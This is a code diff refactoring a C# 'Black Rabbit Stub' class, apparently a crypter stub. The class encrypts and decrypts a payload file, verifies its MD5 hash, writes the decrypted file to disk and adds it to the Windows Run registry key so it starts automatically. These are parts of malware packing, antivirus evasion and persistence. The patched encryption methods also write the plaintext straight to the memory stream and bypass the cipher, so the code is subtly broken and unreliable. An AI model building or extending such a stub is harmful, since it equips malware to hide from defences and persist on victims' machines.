@@ -7,18 +7,26 @@ using Microsoft.Win32;
 /// <summary>
 /// Black Rabbit Stub Class
 /// </summary>
-public class brstub
+public class Brstub
 {
     //variables
 
     byte[] decrypted;
 
+    /// <summary>
+    /// Get decrypted value
+    /// </summary>
     public byte[] Decrypted { get => decrypted; }
 
-    public enum regKeyType
+    /// <summary>
+    /// Type of register key.
+    /// </summary>
+    public enum RegKeyType
     {
-        CurrentUser,
+#pragma warning disable CS1591
+        CurrentUser,    
         LocalMachine
+#pragma warning restore CS1591
     }
 
     //PRIVATE METHODS
@@ -80,7 +88,7 @@ public class brstub
     /// </summary>
     /// <param name="file">File as byte array.</param>
     /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=key, Item3=IV </returns>
-    public Tuple<byte[], byte[], byte[]> encrypt(byte[] file)
+    public Tuple<byte[], byte[], byte[]> Encrypt(byte[] file)
     {
         byte[] encrypted;
         byte[] key;
@@ -108,13 +116,10 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return new Tuple<byte[], byte[], byte[]>(encrypted, key, IV);
@@ -124,9 +129,9 @@ public class brstub
     /// Encrypt file with user set key and random IV.
     /// </summary>
     /// <param name="file">File as byte array.</param>
-    /// <param name="IV">IV as byte array.</param>
+    /// <param name="key">Key as byte array.</param>
     /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=IV </returns>
-    public Tuple<byte[], byte[]> encrypt(byte[] file, byte[] key)
+    public Tuple<byte[], byte[]> Encrypt(byte[] file, byte[] key)
     {
         byte[] encrypted;
         byte[] IV;
@@ -152,13 +157,11 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
+
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return new Tuple<byte[], byte[]>(encrypted, IV);
@@ -171,7 +174,7 @@ public class brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns></returns>
-    public byte[] encrypt(byte[] file, byte[] key, byte[] IV)
+    public byte[] Encrypt(byte[] file, byte[] key, byte[] IV)
     {
         byte[] encrypted;
 
@@ -212,7 +215,7 @@ public class brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns>Byte array of decrypted file.</returns>
-    public byte[] decrypt(byte[] encFile, byte[] key, byte[] IV)
+    public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
     {
 
         
@@ -249,7 +252,7 @@ public class brstub
     /// </summary>
     /// <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
     /// <returns>Return true if hashes are  same, false if hashes are different.</returns>
-    public bool checkMD5(string hashMD5)
+    public bool CheckMD5(string hashMD5)
     {
         using ( MD5 md5Hash = MD5.Create())
         {
@@ -271,7 +274,7 @@ public class brstub
     /// <param name="path">Path to save file</param>
     /// <returns>Return true if file's exist ,false if isn't exist.</returns>
     
-    public bool saveFile(string path )
+    public bool SaveFile(string path )
     {
         File.WriteAllBytes(path, decrypted);
 
@@ -286,14 +289,14 @@ public class brstub
     /// <param name="path">Path to file to autostart.</param>
     /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
     /// <returns>True if register is set or false if error.</returns>
-    public bool addToReg(string appName, string path, regKeyType regKey)
+    public bool AddToReg(string appName, string path, RegKeyType regKey)
     {
         RegistryKey rkApp;
-        if (regKey == regKeyType.CurrentUser)
+        if (regKey == RegKeyType.CurrentUser)
         {
             rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
-        else if (regKey == regKeyType.LocalMachine)
+        else if (regKey == RegKeyType.LocalMachine)
         {
             rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
